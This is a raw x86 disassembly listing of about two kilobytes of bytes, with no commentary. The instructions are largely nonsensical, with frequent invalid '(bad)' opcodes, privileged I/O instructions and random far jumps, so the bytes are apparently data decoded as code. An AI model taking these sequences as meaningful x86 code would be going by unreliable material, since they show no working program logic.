  41346f:	jmp    0x4adc1c0e
  413474:	sub    ebp,DWORD PTR ds:0xc0de781e
  41347a:	retf   
  41347b:	xchg   ebp,eax
  41347c:	imul   edx,esi,0x2697259e
  413482:	mov    cl,0x1a
  413484:	fidiv  DWORD PTR [ecx+0x59078e78]
  41348a:	cmp    ch,0x31
  41348d:	sub    al,0x54
  41348f:	dec    ebx
  413490:	in     eax,dx
  413491:	outs   dx,BYTE PTR ds:[esi]
  413492:	repz retf 
  413494:	add    ebx,ecx
  413496:	rcl    DWORD PTR [ecx+0x74],cl
  413499:	mov    BYTE PTR [eax],0x13
  41349c:	push   eax
  41349d:	hlt    
  41349e:	jmp    0x41346f
  4134a0:	jmp    0xc635:0xfbbd3ae7
  4134a7:	pop    ss
  4134a8:	scas   eax,DWORD PTR es:[edi]
  4134a9:	push   edi
  4134aa:	in     al,dx
  4134ab:	test   eax,0xea4192b9
  4134b0:	jl     0x4134b5
  4134b2:	push   esi
  4134b3:	pop    ebx
  4134b4:	mov    esp,0xfd9d3897
  4134b9:	push   edi
  4134ba:	mov    ah,0x42
  4134bc:	fimul  DWORD PTR [eax+0x3d]
  4134bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134c0:	pop    esi
  4134c1:	inc    edx
  4134c2:	xchg   esp,eax
  4134c3:	push   ds
  4134c4:	sub    eax,0x876feeca
  4134c9:	mov    edx,DWORD PTR [edx-0x2f]
  4134cc:	cld    
  4134cd:	das    
  4134ce:	adc    BYTE PTR [ecx],0x70
  4134d1:	or     ecx,DWORD PTR [edx+0x17ac9e36]
  4134d7:	add    BYTE PTR [esi+0x2c3bd131],bh
  4134dd:	cli    
  4134de:	add    ebx,DWORD PTR [edx+0x3c7fb95f]
  4134e4:	cmp    dh,BYTE PTR [di+0x22]
  4134e8:	push   edx
  4134e9:	mov    bh,0x2e
  4134eb:	fsub   QWORD PTR [ebp-0x8]
  4134ee:	push   0xffffffdf
  4134f0:	jo     0x4134c0
  4134f2:	adc    eax,0x9776712f
  4134f7:	sub    eax,0x6865317c
  4134fc:	pop    eax
  4134fd:	jne    0x413560
  4134ff:	int3   
  413500:	fwait
  413501:	jecxz  0x4134d9
  413503:	or     DWORD PTR ds:[ebp-0x32b3f0ac],edi
  41350a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41350b:	push   esp
  41350c:	sar    ah,cl
  41350e:	inc    eax
  41350f:	pop    edi
  413510:	(bad)  
  413511:	pop    ecx
  413512:	sub    al,0x84
  413514:	jb     0x413558
  413516:	outs   dx,BYTE PTR ds:[esi]
  413517:	clc    
  413518:	(bad)  
  413519:	arpl   WORD PTR [ebx+0x1],cx
  41351c:	repz test DWORD PTR [edi+0x2a813655],esp
  413523:	add    al,0xf8
  413525:	mov    WORD PTR [ecx-0x7e],ss
  413528:	pop    esi
  413529:	inc    esp
  41352a:	mov    ds:0xcb212ea2,eax
  41352f:	sbb    al,0x51
  413531:	mov    ch,0xa9
  413533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413534:	imul   DWORD PTR [ebp-0x53]
  413537:	sahf   
  413538:	call   0x1985:0x533d2134
  41353f:	aaa    
  413540:	arpl   WORD PTR [ecx*1-0x36f47fa4],sp
  413547:	mov    WORD PTR [edi-0x617d4d92],?
  41354d:	(bad)  
  41354e:	call   FWORD PTR [ebx+0x16f4bcdc]
  413554:	pop    edx
  413555:	add    dl,BYTE PTR [eax]
  413557:	outs   dx,BYTE PTR ds:[esi]
  413558:	cmc    
  413559:	mov    ebp,0xdfb8f3f4
  41355e:	adc    dl,ah
  413560:	ror    BYTE PTR [edx],cl
  413562:	addr16 repz (bad) 
  413565:	scas   eax,DWORD PTR es:[edi]
  413566:	scas   al,BYTE PTR es:[edi]
  413567:	sub    DWORD PTR [edx+0x4c],ebp
  41356a:	dec    esp
  41356b:	rol    DWORD PTR [edx+0x49],cl
  41356e:	add    DWORD PTR [ecx+0x2e548910],ebx
  413574:	clc    
  413575:	add    ebx,ebx
  413577:	mov    ebp,0x719b79fe
  41357c:	inc    sp
  41357e:	add    ebx,ecx
  413580:	aad    0xb2
  413582:	xor    al,0x7e
  413584:	(bad)  
  413585:	sbb    al,0xa0
  413587:	add    esp,DWORD PTR [eax]
  413589:	and    ecx,DWORD PTR [edx+0x16]
  41358c:	aad    0x8d
  41358e:	mov    edi,ebp
  413590:	mov    bl,0x9b
  413592:	rcl    DWORD PTR [ebp+0x28],1
  413595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413596:	sbb    ch,bl
  413598:	ret    
  413599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41359a:	xchg   esi,eax
  41359b:	out    dx,al
  41359c:	pusha  
  41359d:	not    DWORD PTR [ecx]
  41359f:	cmp    ebx,edx
  4135a1:	mov    esp,0xd96c27a3
  4135a6:	retf   
  4135a7:	call   0xc932fb67
  4135ac:	lods   eax,DWORD PTR ds:[esi]
  4135ad:	xchg   edx,eax
  4135ae:	adc    al,0xbc
  4135b0:	dec    esp
  4135b1:	loop   0x413582
  4135b3:	push   edx
  4135b4:	adc    ecx,DWORD PTR [eax-0xc1a3f8f]
  4135ba:	or     DWORD PTR [ecx],ecx
  4135bc:	cmp    al,0x3
  4135be:	aas    
  4135bf:	adc    BYTE PTR [ecx],cl
  4135c1:	mov    eax,0xd91d942d
  4135c6:	out    0xa9,al
  4135c8:	inc    esp
  4135c9:	into   
  4135ca:	daa    
  4135cb:	fimul  DWORD PTR [eax-0x8]
  4135ce:	cwde   
  4135cf:	(bad)  
  4135d0:	push   edx
  4135d1:	out    dx,al
  4135d2:	scas   eax,DWORD PTR es:[edi]
  4135d3:	(bad)  
  4135d4:	out    dx,eax
  4135d5:	pop    ebp
  4135d6:	mov    dl,0xf5
  4135d8:	(bad)  
  4135da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135db:	mov    ah,0x61
  4135dd:	adc    ch,dl
  4135df:	push   edx
  4135e0:	inc    ecx
  4135e1:	js     0x4135b2
  4135e3:	xchg   edx,eax
  4135e4:	or     eax,0xa775cda5
  4135e9:	bound  esp,QWORD PTR [edi+eiz*4]
  4135ec:	pusha  
  4135ed:	add    esp,DWORD PTR [ecx+0x18]
  4135f0:	setb   BYTE PTR [edx+0x1d]
  4135f4:	int3   
  4135f5:	daa    
  4135f6:	loopne 0x413663
  4135f8:	and    cl,dl
  4135fa:	psllw  mm4,QWORD PTR [ebx-0x67]
  4135fe:	mov    ecx,0x9aba4558
  413603:	ret    0x98c3
  413606:	hlt    
  413607:	test   eax,0x78127f7e
  41360c:	sub    DWORD PTR [ecx+0x15],edi
  41360f:	retf   0x411
  413612:	jmp    0x24e6132e
  413617:	repnz add edx,ebx
  41361a:	mov    ecx,0x23786cf2
  41361f:	dec    ebp
  413620:	sbb    DWORD PTR [eax+0x7e],esp
  413623:	xor    BYTE PTR [ebp+0xe],ch
  413626:	adc    ah,BYTE PTR [edx+0x26336d71]
  41362c:	inc    ebx
  41362d:	enter  0xd54f,0xb8
  413631:	dec    ecx
  413632:	test   eax,0x99c61805
  413637:	stc    
  413638:	aaa    
  413639:	xor    al,0x9a
  41363b:	xchg   si,ax
  41363d:	cmp    edi,DWORD PTR [edi+0x6ff1cf66]
  413643:	dec    ebx
  413644:	lods   al,BYTE PTR ds:[esi]
  413645:	xchg   ebx,eax
  413646:	or     DWORD PTR [ebx+0x26],ebx
  413649:	repz repnz or BYTE PTR [esi],ah
  41364d:	push   ebx
  41364e:	call   FWORD PTR [edi+0x16]
  413651:	jmp    0xadca:0x280d88d2
  413658:	and    BYTE PTR [eax],ch
  41365a:	cwde   
  41365b:	push   ebx
  41365c:	aas    
  41365d:	cmp    al,0x27
  41365f:	stos   DWORD PTR es:[edi],eax
  413660:	in     al,0x4
  413662:	xchg   esi,eax
  413663:	ss mov bh,0x25
  413666:	inc    edi
  413667:	in     al,dx
  413668:	sub    ebx,DWORD PTR [ebp-0x6f]
  41366b:	mov    dl,0x56
  41366d:	or     DWORD PTR [eax+0x4d1dd78a],eax
  413673:	rol    dh,0x3f
  413676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413677:	push   esp
  413678:	mov    edx,0xb3667724
  41367d:	cwde   
  41367e:	xchg   ebx,eax
  41367f:	js     0x413694
  413681:	jge    0x413619
  413683:	cli    
  413684:	jne    0x413689
  413686:	lods   al,BYTE PTR ds:[esi]
  413687:	aam    0xa
  413689:	lods   eax,DWORD PTR ds:[esi]
  41368a:	retf   
  41368b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41368d:	push   esi
  41368e:	xor    bh,BYTE PTR [ecx+0x2ece8831]
  413694:	mov    dl,0xc6
  413696:	xor    eax,0x13fa6dc4
  41369b:	rcr    esi,0xfb
  41369e:	test   al,0x30
  4136a0:	sti    
  4136a1:	inc    ecx
  4136a2:	and    edx,DWORD PTR [esi]
  4136a4:	bound  edx,QWORD PTR [edx-0x62]
  4136a7:	pop    ds
  4136a8:	icebp  
  4136a9:	jp     0x413666
  4136ab:	fsubr  DWORD PTR [esi-0x27]
  4136ae:	call   0x33fc6473
  4136b3:	jb     0x4136ac
  4136b5:	and    edi,DWORD PTR [edi-0x40b41621]
  4136bb:	pop    ds
  4136bc:	frstor [edx+0x27eef4c6]
  4136c2:	xor    esi,DWORD PTR [esi]
  4136c4:	adc    eax,0x5ab04c9f
  4136c9:	add    bh,bh
  4136cb:	sub    edx,esi
  4136cd:	sub    BYTE PTR [edi*8-0x4a75f7da],0xf5
  4136d5:	outs   dx,DWORD PTR ds:[esi]
  4136d6:	inc    ebp
  4136d7:	sbb    edi,DWORD PTR [eax+ebx*1]
  4136da:	jl     0x413677
  4136dc:	pushf  
  4136dd:	pop    edx
  4136de:	(bad)  
  4136df:	stc    
  4136e0:	push   ebp
  4136e1:	mov    ds:0x937d6bf2,al
  4136e6:	bnd jg 0x4136ca
  4136e9:	or     esp,DWORD PTR [edx]
  4136eb:	sub    al,0xfd
  4136ed:	test   DWORD PTR [eax+ecx*2+0x5],0xe5ce9d92
  4136f5:	sub    al,0xf5
  4136f7:	add    BYTE PTR [esi-0x35],al
  4136fa:	add    al,BYTE PTR [edx]
  4136fc:	(bad)  
  4136fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136fe:	push   ebx
  4136ff:	push   esi
  413700:	out    dx,al
  413701:	fucomip st,st(0)
  413703:	ret    
  413704:	out    0xbe,ax
  413707:	xor    eax,0x2af7ef1b
  41370c:	dec    eax
  41370d:	xor    ah,BYTE PTR [esi+0x2a851190]
  413713:	mov    cl,0x23
  413715:	inc    edx
  413716:	add    eax,0xf31590d4
  41371b:	test   al,0x7f
  41371d:	jl     0x41370e
  41371f:	mov    ebx,DWORD PTR [ecx]
  413721:	sti    
  413722:	iret   
  413723:	pop    esp
  413724:	pushf  
  413725:	lock int3 
  413727:	aaa    
  413728:	repz aas 
  41372a:	and    al,0x6d
  41372c:	iret   
  41372d:	mov    eax,ds:0xc29482ef
  413732:	adc    DWORD PTR [edx-0x58e0c643],ebp
  413738:	sahf   
  413739:	outs   dx,DWORD PTR ds:[esi]
  41373a:	mov    edx,0xa7268093
  41373f:	jne    0x413797
  413741:	addr16 mov esi,0xb1ae6fd3
  413747:	lods   eax,DWORD PTR ds:[esi]
  413748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413749:	std    
  41374a:	jmp    0x3b3d:0x8ea035f0
  413751:	jecxz  0x4136d4
  413753:	in     al,dx
  413754:	add    al,0x53
  413756:	pop    edx
  413757:	ins    BYTE PTR es:[edi],dx
  413758:	popa   
  413759:	call   0xe493ca00
  41375e:	popf   
  41375f:	seto   BYTE PTR [ecx]
  413762:	cmp    BYTE PTR [edi],bl
  413764:	idiv   BYTE PTR [esi+0x1f4299f3]
  41376a:	jmp    0x33f10b18
  41376f:	call   FWORD PTR ds:0x98c016ea
  413775:	sbb    al,0x54
  413777:	dec    ebp
  413778:	sub    DWORD PTR [eax],ebp
  41377a:	adc    edx,edx
  41377c:	mov    ebx,0xcd3f5fc4
  413781:	lock fwait
  413783:	aad    0xf2
  413785:	cmp    BYTE PTR [ebx],0x68
  413788:	mov    ecx,0xf00afac0
  41378d:	mov    gs,WORD PTR [esi]
  41378f:	sahf   
  413790:	jo     0x413810
  413792:	in     eax,dx
  413793:	rcr    DWORD PTR [eax-0x2ef568c4],0xc0
  41379a:	sbb    ch,0xf9
  41379d:	or     esp,DWORD PTR [ecx-0x18374a8f]
  4137a3:	call   ebp
  4137a5:	mov    ch,0x3e
  4137a7:	push   eax
  4137a8:	pop    esi
  4137a9:	call   0x79863ea1
  4137ae:	adc    eax,0xc717edc9
  4137b3:	dec    ebp
  4137b4:	int    0x71
  4137b6:	ss fwait
  4137b8:	push   ebx
  4137b9:	dec    si
  4137bb:	jl     0x41376a
  4137bd:	push   esi
  4137be:	and    al,0x18
  4137c0:	daa    
  4137c1:	scas   al,BYTE PTR es:[edi]
  4137c2:	sbb    ebp,DWORD PTR [ebx+0x2b]
  4137c5:	int    0x93
  4137c7:	lock cli 
  4137c9:	pop    esp
  4137ca:	jle    0x41374c
  4137cc:	sub    BYTE PTR [esi+edi*4-0x34],0xf9
  4137d1:	outs   dx,DWORD PTR ds:[esi]
  4137d2:	in     eax,0x88
  4137d4:	stc    
  4137d5:	add    eax,0x9de0d0c0
  4137da:	cli    
  4137db:	ins    DWORD PTR es:[edi],dx
  4137dc:	mov    edx,0xf846c0be
  4137e1:	test   al,0x5b
  4137e3:	xchg   ebx,ebp
  4137e5:	pop    ecx
  4137e6:	mov    bl,0xa8
  4137e8:	or     DWORD PTR [esi-0x5b6546af],ebx
  4137ee:	mov    ?,WORD PTR [edi-0x1c]
  4137f1:	xchg   ebp,eax
  4137f2:	cmp    eax,0xfaea48f0
  4137f7:	aaa    
  4137f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137f9:	fnstcw WORD PTR ds:0x85e51377
  4137ff:	sub    edx,DWORD PTR [esi-0x26]
  413802:	pop    ebx
  413803:	jnp    0x413807
  413805:	add    DWORD PTR [ecx],edi
  413807:	into   
  413808:	lahf   
  413809:	dec    esp
  41380a:	fs retf 
  41380c:	mov    esp,0xb2b1400e
  413811:	mov    BYTE PTR [ebx],bl
  413813:	push   ds
  413814:	ror    DWORD PTR [edi-0x23],1
  413817:	aas    
  413818:	mov    edx,edx
  41381a:	xor    ah,BYTE PTR [edx+0x46]
  41381d:	shl    BYTE PTR [edi-0x16d860a6],1
  413823:	stos   DWORD PTR es:[edi],eax
  413824:	jne    0x4137cd
  413826:	push   cs
  413827:	add    bl,al
  413829:	in     al,dx
  41382a:	jecxz  0x413834
  41382c:	push   ebx
  41382d:	stos   DWORD PTR es:[edi],eax
  41382e:	push   ebx
  41382f:	adc    BYTE PTR [edi+0x61bcbe7c],al
  413835:	xchg   ebp,eax
  413836:	and    BYTE PTR [ebx+0x3],dh
  413839:	dec    edi
  41383a:	or     al,0x9f
  41383c:	mov    dh,0xab
  41383e:	xor    esp,edi
  413840:	shr    BYTE PTR [eax+0x3e6e324c],1
  413846:	mov    esp,0xa6d444c9
  41384b:	mul    BYTE PTR [eax+0x70]
  41384e:	sahf   
  41384f:	push   0xffffffed
  413851:	repnz (bad) 
  413853:	mov    edx,0x10fee2eb
  413858:	xor    ah,BYTE PTR [ebp+edx*1-0x5e]
  41385c:	jno    0x41382a
  41385e:	ds inc ebx
  413860:	and    ch,ah
  413862:	add    dh,BYTE PTR [ebx]
  413864:	dec    edx
  413865:	in     eax,dx
  413866:	jle    0x413891
  413868:	nop
  413869:	mov    al,0x73
  41386b:	(bad)  
  41386c:	sub    ah,ch
  41386e:	int3   
  41386f:	call   0x8c28:0xbeede1b4
  413876:	jmp    0x44536717
  41387b:	adc    al,0x8b
  41387d:	cdq    
  41387e:	inc    esi
  41387f:	call   0xcef31d65
  413884:	inc    esp
  413885:	jae    0x4138bc
  413887:	imul   edx,DWORD PTR [ecx+0x8],0xfe0cd4f3
  41388e:	sbb    eax,0xe1d19662
  413893:	loop   0x41389e
  413895:	sub    DWORD PTR [ebx-0x11d63638],0x8eccd1a
  41389f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138a0:	je     0x41384e
  4138a2:	out    0xb7,al
  4138a4:	adc    ah,cl
  4138a6:	out    dx,al
  4138a7:	mov    ecx,0xf0094f46
  4138ac:	ins    DWORD PTR es:[edi],dx
  4138ad:	in     al,0xd3
  4138af:	jno    0x4138a9
  4138b1:	fsubr  DWORD PTR [ecx+0x4b]
  4138b4:	mov    bl,0x64
  4138b6:	fnsave [ebp-0x33418a9d]
  4138bc:	out    0x28,al
  4138be:	sbb    DWORD PTR ds:0xd04de58,ebp
  4138c4:	mov    dh,BYTE PTR [edi-0xa]
  4138c7:	retf   0x95ab
  4138ca:	sub    al,0xfc
  4138cc:	call   0xa527b05d
  4138d1:	out    dx,eax
  4138d2:	sbb    ecx,DWORD PTR [esi]
  4138d4:	daa    
  4138d5:	and    ch,BYTE PTR [ebp-0x5b51822e]
  4138db:	pop    edi
  4138dc:	lahf   
  4138dd:	cmp    dl,dl
  4138df:	add    BYTE PTR [ecx-0x50c87122],cl
  4138e5:	stos   BYTE PTR es:[edi],al
  4138e6:	cmp    esi,ebx
  4138e8:	jl     0x41389f
  4138ea:	xor    eax,0x5276451c
  4138ef:	dec    esp
  4138f0:	rol    BYTE PTR [eax+0x61],0x65
  4138f4:	xor    ebp,DWORD PTR ss:[ecx-0x1e]
  4138f8:	sub    DWORD PTR [ebp+0x1e72f3d3],esp
  4138fe:	push   0x64
  413900:	les    esi,FWORD PTR [ebp+ebx*2-0x73a99cdb]
  413907:	xchg   DWORD PTR [eax],eax
  413909:	cs cmc 
  41390b:	aam    0x49
  41390d:	sub    DWORD PTR [ecx-0x65],ebp
  413910:	jnp    0x4138f4
  413912:	mul    DWORD PTR [esi+0x317b167a]
  413918:	jae    0x413987
  41391a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41391b:	jmp    0x8682:0xf9a689f4
  413922:	push   0x36
  413924:	jns    0x4138e5
  413926:	pop    es
  413927:	sub    BYTE PTR [ecx-0x10],dl
  41392a:	inc    eax
  41392b:	bnd jns 0x413980
  41392e:	lods   eax,DWORD PTR ds:[esi]
  41392f:	loop   0x4138c9
  413931:	enter  0x3c6a,0xef
  413935:	xchg   ebx,eax
  413936:	in     al,dx
  413937:	mov    BYTE PTR [edi],dh
  413939:	pop    ebp
  41393a:	pop    es
  41393b:	dec    esi
  41393c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41393d:	aaa    
  41393e:	adc    edi,DWORD PTR [esi+esi*2+0x31363507]
  413945:	fwait
  413946:	add    al,0xa5
  413948:	out    0x24,al
  41394a:	xor    DWORD PTR [ecx],ebp
  41394c:	aam    0x11
  41394e:	fmul   st,st(3)
  413950:	mov    dh,dh
  413952:	mov    eax,ds:0xbb42d1b4
  413957:	mov    ch,0xc1
  413959:	mov    esp,0xaac264b4
  41395e:	jle    0x413949
  413960:	or     DWORD PTR [eax],esp
  413962:	xor    BYTE PTR [ebx-0xa3da9bc],dl
  413968:	inc    eax
  413969:	test   esi,ebx
  41396b:	sbb    al,0x56
  41396d:	cmp    bh,BYTE PTR [edi]
  41396f:	loopne 0x4139d6
  413971:	mov    DWORD PTR [ecx],esi
  413973:	jmp    0x41397a
  413975:	jmp    0x4139c1
  413977:	loop   0x41393f
  413979:	test   BYTE PTR [edx-0x32e5b1a8],cl
  41397f:	lahf   
  413980:	pushf  
  413981:	dec    esp
  413982:	inc    edi
  413983:	cwde   
  413984:	mov    al,fs:0x775337ac
  41398a:	and    ch,BYTE PTR [edx-0x2d460e4f]
  413990:	pop    esi
  413991:	nop
  413992:	inc    ebx
  413993:	bound  esp,QWORD PTR [ebp+0x21e88f36]
  413999:	dec    eax
  41399a:	int    0x2b
  41399c:	pop    eax
  41399d:	call   FWORD PTR [esi]
  41399f:	mov    ds:0x3920bb9,al
  4139a4:	inc    eax
  4139a5:	and    al,0x63
  4139a7:	in     al,dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	dec    DWORD PTR [edx+esi*2-0x17]
  4139ad:	jno    0x413988
  4139af:	pop    ebx
  4139b0:	adc    DWORD PTR ds:0xc32e73fd,edi
  4139b6:	fist   WORD PTR [ebx]
  4139b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b9:	daa    
  4139ba:	sub    BYTE PTR [eax],bh
  4139bc:	xchg   esi,eax
  4139bd:	xchg   esp,eax
  4139be:	mov    dl,0xb6
  4139c0:	fnstsw WORD PTR [ebp+0x5]
  4139c3:	dec    esi
  4139c4:	push   0x7f
  4139c6:	(bad)  
  4139c7:	(bad)  
  4139c8:	xchg   esi,eax
  4139c9:	frstpm(287 only) 
  4139cb:	and    eax,0x2acaae2b
  4139d0:	fwait
  4139d1:	lea    eax,[ebp+0x4b94cc5f]
  4139d7:	mov    eax,eax
  4139d9:	push   ds
  4139da:	mov    eax,0x735fcd6d
  4139df:	inc    edx
  4139e0:	out    0xd2,al
  4139e2:	xchg   edi,edx
  4139e4:	add    eax,0x6e8fd70b
  4139e9:	push   esi
  4139ea:	xchg   edx,eax
  4139eb:	xor    al,0xfd
  4139ed:	xchg   edi,eax
  4139ee:	jge    0x413a03
  4139f0:	jns    0x4139ce
  4139f2:	pop    edx
  4139f3:	scas   eax,DWORD PTR es:[edi]
  4139f4:	ror    BYTE PTR [edi+0x15],cl
  4139f7:	pop    esp
  4139f8:	retf   0x5d85
  4139fb:	jb     0x413a5f
  4139fd:	cmp    BYTE PTR [edi+esi*1],bh
  413a00:	unpcklps xmm5,xmm6
  413a03:	ds inc edx
  413a05:	fdivr  DWORD PTR ds:0x5c588b70
  413a0b:	bnd call 0x30c8d5c8
  413a11:	dec    esi
  413a12:	js     0x4139c6
  413a14:	mov    ds:0x97c06994,eax
  413a19:	cmp    DWORD PTR [edx],0xffffffaf
  413a1c:	pusha  
  413a1d:	sti    
  413a1e:	mov    dh,0x4
  413a20:	clc    
  413a21:	popf   
  413a22:	cmp    al,0x1a
  413a24:	dec    esi
  413a25:	sbb    al,BYTE PTR [ebx+0x43aeea8]
  413a2b:	cli    
  413a2c:	inc    ebp
  413a2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a2e:	loopne 0x413a90
  413a30:	fs jnp 0x413a22
  413a33:	jns    0x4139f8
  413a35:	push   ds
  413a36:	inc    ebx
  413a37:	fcomi  st,st(7)
  413a39:	jmp    0xbce81cac
  413a3e:	into   
  413a3f:	loop   0x4139fa
  413a41:	mov    esp,0xfb93e297
  413a46:	das    
  413a47:	pop    esi
  413a48:	pop    eax
  413a49:	in     eax,dx
  413a4a:	dec    ebp
  413a4b:	pop    ecx
  413a4c:	xchg   ecx,eax
  413a4d:	sub    DWORD PTR [eax+0xa79d9e9],ebx
  413a53:	loope  0x4139d5
  413a55:	fs hlt 
  413a57:	pusha  
  413a58:	ss xchg ebx,eax
  413a5a:	or     ecx,0x69
  413a5d:	out    0x91,eax
  413a5f:	push   edi
  413a60:	push   ds
  413a61:	out    dx,eax
  413a62:	jns    0x413a69
  413a64:	(bad)  
  413a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a66:	sbb    ecx,DWORD PTR [edx+0x764eba02]
  413a6c:	iret   
  413a6d:	mov    edi,0x1d281203
  413a72:	jns    0x413a35
  413a74:	out    dx,al
  413a75:	dec    edx
  413a76:	out    0xe1,al
  413a78:	data16 or al,BYTE PTR [esi]
  413a7b:	mov    edi,0xa27e1c79
  413a80:	mov    ch,0x9f
  413a82:	dec    edx
  413a83:	push   esi
  413a84:	mov    ebx,0xcae49335
  413a89:	push   cs
  413a8a:	out    0x9,al
  413a8c:	(bad)  
  413a8d:	pushf  
  413a8e:	dec    ebp
  413a8f:	mov    ?,WORD PTR ds:0x9bbf1320
  413a95:	mov    ah,0x61
  413a97:	xchg   edi,eax
  413a98:	pushf  
  413a99:	jbe    0x413a44
  413a9b:	les    edi,FWORD PTR ds:0x8c93c39e
  413aa1:	and    eax,0x1eb629c3
  413aa6:	dec    esi
  413aa7:	xor    cl,BYTE PTR [ecx-0x5f]
  413aaa:	pop    ebp
  413aab:	mov    ecx,0x19afdf0e
  413ab0:	add    dl,0x24
  413ab3:	mov    ds:0x5e700012,eax
  413ab8:	ror    bh,1
  413aba:	ret    0x2e76
  413abd:	fidiv  WORD PTR [eax+esi*8]
  413ac0:	and    BYTE PTR [eax+0x38],0xd7
  413ac4:	in     al,dx
  413ac5:	sub    esp,DWORD PTR [esi-0x7a]
  413ac8:	std    
  413ac9:	cmp    al,al
  413acb:	stc    
  413acc:	jae    0x413adf
  413ace:	jmp    0xc5cb03d9
  413ad3:	cmp    ebp,esp
  413ad5:	cmc    
  413ad6:	adc    eax,0xf7471453
  413adb:	out    dx,eax
  413adc:	mov    dh,0xba
  413ade:	cld    
  413adf:	xchg   DWORD PTR gs:[edi+edi*8],edi
  413ae3:	retf   0x431b
  413ae6:	out    dx,al
  413ae7:	mov    edi,ecx
  413ae9:	mov    bh,0xa9
  413aeb:	xlat   BYTE PTR ds:[ebx]
  413aec:	stos   DWORD PTR es:[edi],eax
  413aed:	mov    DWORD PTR [ebp-0x5b],edx
  413af0:	sbb    BYTE PTR [ebp+0x7970c8fb],0x18
  413af7:	xchg   ecx,eax
  413af8:	and    bl,BYTE PTR [eax+0xeee38f]
  413afe:	outs   dx,BYTE PTR ds:[esi]
  413aff:	mov    ebx,0x216ff42
  413b04:	jmp    0x338c1fdd
  413b09:	popf   
  413b0a:	mov    al,0x8
  413b0c:	inc    ecx
  413b0d:	xchg   edx,eax
  413b0e:	aas    
  413b0f:	aad    0x32
  413b11:	adc    eax,0x15c96719
  413b16:	adc    DWORD PTR [ebx+ecx*4+0xa],0x1deb2b34
  413b1e:	popf   
  413b1f:	shl    DWORD PTR [edx+0x29],0x18
  413b23:	add    al,0x20
  413b25:	pusha  
  413b26:	mov    al,0x69
  413b28:	daa    
  413b29:	sub    al,0x16
  413b2b:	inc    ebp
  413b2d:	pop    ss
  413b2e:	and    al,0xfd
  413b30:	xlat   BYTE PTR ds:[ebx]
  413b31:	pop    ds
  413b32:	xchg   edx,eax
  413b33:	stc    
  413b34:	sbb    BYTE PTR [edx-0xbc9f47a],0xd0
  413b3b:	dec    esi
  413b3c:	dec    edx
  413b3d:	jns    0x413ac5
  413b3f:	adc    eax,esp
  413b41:	mov    esi,0xeb84dcc7
  413b46:	aas    
  413b47:	push   cs
  413b48:	dec    eax
  413b4a:	xchg   esp,eax
  413b4b:	add    esi,ebp
  413b4d:	loopne 0x413b77
  413b4f:	mov    ebx,0xddd1abf8
  413b54:	push   esi
  413b55:	loopne 0x413baa
  413b57:	aad    0xa8
  413b59:	iret   
  413b5a:	xchg   esi,eax
  413b5b:	out    dx,al
  413b5c:	xor    dh,al
  413b5e:	add    BYTE PTR [eax+0x72],0x75
  413b62:	xchg   edi,eax
  413b63:	jmp    0x413b73
  413b65:	add    BYTE PTR [esi-0x44489706],bh
  413b6b:	add    dh,0x7e
  413b6e:	test   eax,0x39123db6
  413b73:	mov    edi,0x8714305a
  413b78:	sub    BYTE PTR [edi+esi*2-0x4af00527],bl
  413b7f:	mov    dl,0x37
  413b81:	imul   eax,DWORD PTR [ecx+0x79],0x45591e82
  413b88:	stos   BYTE PTR es:[edi],al
  413b89:	dec    ebx
  413b8a:	(bad)  
  413b8b:	clc    
  413b8c:	lock jmp FWORD PTR [edx]
  413b8f:	cwde   
  413b90:	sub    eax,0xf9ae4a17
  413b95:	push   esi
  413b96:	out    dx,eax
  413b97:	test   al,0x80
  413b99:	in     al,0x61
  413b9b:	xor    al,BYTE PTR [edi-0x225c2e37]
  413ba1:	jge    0x413bb0
  413ba3:	stc    
  413ba4:	pop    DWORD PTR [edx+0x1889369]
  413baa:	repnz mov edx,0xbd088c8b
  413bb0:	rcl    cl,1
  413bb2:	mov    edx,0x22d488c6
  413bb7:	mov    WORD PTR [eax+0x36],cs
  413bba:	jnp    0x413c2b
  413bbc:	add    edi,DWORD PTR [edx]
  413bbe:	or     eax,0x4704f800
  413bc3:	in     al,0x9b
  413bc5:	jno    0x413b6e
  413bc7:	mov    ch,0x30
  413bc9:	mov    eax,0x1bdb198e
  413bce:	cmp    BYTE PTR [esi+0x43],0xb8
  413bd2:	inc    edx
  413bd3:	xor    al,0x1a
  413bd5:	sub    bl,cl
  413bd7:	sbb    BYTE PTR [ebp-0x1f623132],al
  413bdd:	xchg   ecx,eax
  413bde:	ins    DWORD PTR es:[edi],dx
  413bdf:	lahf   
  413be0:	pop    es
  413be1:	icebp  
  413be2:	jl     0x413c61
  413be4:	or     DWORD PTR [edi],edi
  413be6:	add    al,BYTE PTR [edi]
  413be8:	retf   0xb41
  413beb:	in     eax,0xa7
  413bed:	inc    edi
  413bee:	inc    ecx
  413bef:	pop    es
  413bf0:	loop   0x413bc3
  413bf2:	std    
  413bf3:	inc    esp
  413bf4:	loop   0x413b90
  413bf6:	out    dx,al
  413bf7:	sbb    DWORD PTR [edi+0x6e],edi
  413bfa:	mov    al,0x50
  413bfc:	or     ah,bh
  413bfe:	sbb    eax,0x79c5b257
  413c03:	add    eax,0x39d49b96
  413c08:	leave  
  413c09:	pop    ds
  413c0a:	retf   0xff98
  413c0d:	sub    eax,DWORD PTR [eax+0x17981499]
  413c13:	sahf   
  413c14:	(bad)  
  413c15:	shr    BYTE PTR [eax-0x3c],1
  413c18:	xchg   ebp,eax
  413c19:	xor    DWORD PTR [ebx-0x4e2aabd7],edx
  413c1f:	jg     0x413bcb
